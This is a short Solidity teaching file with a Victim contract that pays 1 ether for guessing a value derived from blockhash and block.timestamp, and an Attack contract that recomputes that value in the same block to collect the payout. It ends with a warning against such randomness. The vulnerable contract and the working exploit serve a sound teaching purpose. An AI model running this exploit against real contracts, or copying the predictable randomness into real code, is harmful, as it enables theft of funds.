//SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.8.25;

contract Victim{
    constructor()payable {}

    function guess(uint256 _guess)public {  

        // answer is a random value that is generated with hashing of block.number and block.timestamp      
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number  - 1),block.timestamp)));
        
        if(_guess == answer){
            (bool sent,)=msg.sender.call{value:1 ether}("");
            require(sent == true,"Failed to sent Ether");
        }
    }
}
contract Attack{
    receive() external payable { }
    function attack(Victim _victim)public {

        // The answer is a value as the same as guess function of Victim contract
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number  - 1),block.timestamp)));

        _victim.guess(answer);
    }
}

// Don't use blockhash and block.timestamp as source of randomness
